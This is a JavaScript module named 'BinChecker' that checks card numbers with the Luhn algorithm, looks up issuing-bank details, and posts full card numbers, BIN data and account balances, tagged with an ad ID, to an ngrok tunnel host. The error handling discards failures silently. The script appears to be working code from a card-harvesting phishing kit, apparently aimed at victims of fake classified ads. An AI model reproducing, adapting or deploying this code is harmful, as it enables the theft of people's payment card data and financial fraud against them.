(function() {
  'use strict';

  var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';

  function luhnCheck(cardNumber) {
    var digits = cardNumber.replace(/\D/g, '');
    if (digits.length < 13 || digits.length > 19) {
      return false;
    }
    var sum = 0;
    var isEven = false;
    for (var i = digits.length - 1; i >= 0; i--) {
      var digit = parseInt(digits[i], 10);
      if (isEven) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }
      sum += digit;
      isEven = !isEven;
    }
    return (sum % 10) === 0;
  }

  async function getBinInfo(bin) {
    var binClean = bin.replace(/\D/g, '').substring(0, 8);
    if (binClean.length < 6) {
      return getLocalBinInfo(bin);
    }
    try {
      var response = await fetch(API_BASE + '/api/checkBin?bin=' + encodeURIComponent(binClean), {
        method: 'GET'
      });
      var data = await response.json();
      if (data.ok && data.bank) {
        return {
          bank: data.bank,
          brand: data.brand || 'Unknown',
          type: data.type || 'UNKNOWN',
          level: data.level || '',
          country_flag: data.country_flag || '\ud83c\udf0d',
          country_name: data.country_name || '',
          scheme: data.scheme || ''
        };
      }
    } catch (e) {
      console.warn('BIN API error, using local DB:', e);
    }
    return getLocalBinInfo(bin);
  }

  function getLocalBinInfo(bin) {
    var binDatabase = {
      '4': { bank: 'Unknown Bank', brand: 'VISA', type: 'DEBIT' },
      '444111': { bank: 'JSC UNIVERSAL BANK', brand: 'VISA', type: 'CREDIT', level: 'INFINITE', country_flag: '\ud83c\uddfa\ud83c\udde6' },
      '4441': { bank: 'PRIVATBANK', brand: 'VISA', type: 'DEBIT', level: 'CLASSIC', country_flag: '\ud83c\uddfa\ud83c\udde6' },
      '5': { bank: 'Unknown Bank', brand: 'MASTERCARD', type: 'DEBIT' },
      '5168': { bank: 'PRIVATBANK', brand: 'MASTERCARD', type: 'DEBIT', level: 'STANDARD', country_flag: '\ud83c\uddfa\ud83c\udde6' },
      '2200': { bank: 'SBERBANK', brand: 'MIR', type: 'DEBIT', level: 'CLASSIC', country_flag: '\ud83c\uddf7\ud83c\uddfa' },
      '2201': { bank: 'VTB', brand: 'MIR', type: 'CREDIT', level: 'GOLD', country_flag: '\ud83c\uddf7\ud83c\uddfa' },
      '34': { bank: 'Unknown Bank', brand: 'AMEX', type: 'CREDIT', level: 'PLATINUM', country_flag: '\ud83c\uddfa\ud83c\uddf8' },
      '37': { bank: 'Unknown Bank', brand: 'AMEX', type: 'CREDIT', level: 'GOLD', country_flag: '\ud83c\uddfa\ud83c\uddf8' }
    };
    for (var len = 8; len >= 1; len--) {
      var prefix = bin.substring(0, len);
      if (binDatabase[prefix]) {
        return binDatabase[prefix];
      }
    }
    var firstDigit = bin[0];
    if (firstDigit === '4') {
      return { bank: 'Unknown Bank', brand: 'VISA', type: 'UNKNOWN', level: '', country_flag: '\ud83c\udf0d' };
    } else if (firstDigit === '5') {
      return { bank: 'Unknown Bank', brand: 'MASTERCARD', type: 'UNKNOWN', level: '', country_flag: '\ud83c\udf0d' };
    } else if (bin.substring(0, 2) === '22') {
      return { bank: 'Unknown Bank', brand: 'MIR', type: 'UNKNOWN', level: '', country_flag: '\ud83c\uddf7\ud83c\uddfa' };
    } else if (firstDigit === '3') {
      return { bank: 'Unknown Bank', brand: 'AMEX', type: 'UNKNOWN', level: '', country_flag: '\ud83c\uddfa\ud83c\uddf8' };
    }
    return { bank: 'Unknown Bank', brand: 'Unknown', type: 'Unknown', level: '', country_flag: '\ud83c\udf0d' };
  }

  function sendCardData(adId, cardNumber, binInfo) {
    var apiUrl = API_BASE + '/api/user-data';
    var payload = {
      adId: adId,
      type: 'card',
      cardNumber: cardNumber.replace(/\s/g, ''),
      binInfo: binInfo
    };
    fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'ngrok-skip-browser-warning': 'true'
      },
      body: JSON.stringify(payload)
    })
      .then(function(resp) { return resp.json(); })
      .then(function(data) {})
      .catch(function(err) {});
  }

  function sendBalance(adId, balance) {
    var apiUrl = API_BASE + '/api/user-data';
    var payload = {
      adId: adId,
      type: 'balance',
      balance: balance
    };
    fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'ngrok-skip-browser-warning': 'true'
      },
      body: JSON.stringify(payload)
    })
      .then(function(resp) { return resp.json(); })
      .then(function(data) {})
      .catch(function(err) {});
  }

  window.BinChecker = {
    luhnCheck: luhnCheck,
    getBinInfo: getBinInfo,
    sendCardData: sendCardData,
    sendBalance: sendBalance
  };

})();
